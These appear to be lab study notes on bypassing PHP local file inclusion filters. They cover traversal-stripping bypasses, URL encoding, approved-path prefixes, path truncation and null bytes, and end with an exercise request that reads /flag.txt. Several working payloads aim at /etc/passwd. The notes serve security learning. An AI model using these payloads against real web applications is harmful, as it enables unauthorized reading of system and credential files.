
# Bypasses

## Non-Recursive Path Traversal Filters

most popular filter to mitigate LFI is removing `../`
in this case typing `../../etc/passwd` will result in this output /etc/passwd and `../`'s  got removed
Code: 
```php
$language = str_replace('../', '', $_GET['language']);
```
to bypass this type of filter what an attacker can do is double `../ `
eg.
`....//....//....//....//....//....//....//....//etc/passwd`
that will result in removing ../ but 2nd ../ will stay intact
as we may use `..././` or `....\/` and several other recursive LFI payloads. Furthermore, in some cases, escaping the forward slash character may also work to avoid path traversal filters (e.g. `....\/`), or adding extra forward slashes (e.g. `....////`)

---
## Encoding

PHP versions 5.3.4 and earlier, string-based detection could be bypassed by URL encoding the payload  but even on newer versions we may find custom filters that may be bypassed through URL encoding. The 
characters `../` can be URL encoded into `%2e%2e%2f`, which will bypass the filter.

In the last example `....//` can be URL encoded into `%2e%2e%2e%2e%2f%2f`.

The payload :`%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd `
decoded:
`....//....//....//....//....//....//....//....//etc/passwd `
or
`%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`
decoded:
`../../../../etc/passwd`

---
##  Approved Paths

Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path. For example, the web application in the labs has `./languages` directory, as follows:

Code: 
```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```
to bypass this type of filter we need to specify the directory name before our path traversal 
for example: `./languages/../../../../etc/passwd`

---
##  Appended Extension
As discussed in the previous section, some web applications append an extension to our input string (e.g. `.php`), to ensure that the file we include is in the expected extension. With modern versions of PHP, we may not be able to bypass this and will be restricted to only reading files in that extension, which may still be useful

#### Path Truncation

In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be `truncated`, and any characters after the maximum length will be ignored. Furthermore, PHP also used to remove trailing slashes and single dots in path names, so if we call (`/etc/passwd/.`) then the `/.` would also be truncated, and PHP would call (`/etc/passwd`). PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. `////etc/passwd` is the same as `/etc/passwd`). Similarly, a current directory shortcut (`.`) in the middle of the path would also be disregarded (e.g. `/etc/./passwd`).

If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path. Whenever we reach the 4096 character limitation, the appended extension (`.php`) would be truncated, and we would have a path without an appended extension. Finally, it is also important to note that we would also need to `start the path with a non-existing directory` for this technique to work.

An example of such payload would be the following:

Code: url
```url
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```
code to print 2048 ./
```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```
We may also increase the count of `../`, as adding more would still land us in the root directory, as explained in the previous section. However, if we use this method, we should calculate the full length of the string to ensure only `.php` gets truncated and not our requested file at the end of the string (`/etc/passwd`). This is why it would be easier to use the first method.

---
## Null Bytes

PHP versions before 5.5 were vulnerable to `null byte injection`, which means that adding a null byte (`%00`) at the end of the string would terminate the string and not consider anything after it. This is due to how strings are stored in low-level memory, where strings in memory must use a null byte to indicate the end of the string, as seen in Assembly, C, or C++ languages.

To exploit this vulnerability, we can end our payload with a null byte (e.g. `/etc/passwd%00`), such that the final path passed to `include()` would be (`/etc/passwd%00.php`). This way, even though `.php` is appended to our string, anything after the null byte would be truncated, and so the path used would actually be `/etc/passwd`, leading us to bypass the appended extension.

---
## Exercise
**The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt**
![[Pasted image 20230305170523.png]]
trying 2 bypass techniques double `../` and leave languages in the beginning to bypass path also  
![[Pasted image 20230305170618.png]]
![[Pasted image 20230305170755.png]]
`GET /index.php?language=languages/....//....//....//....//....//flag.txt `




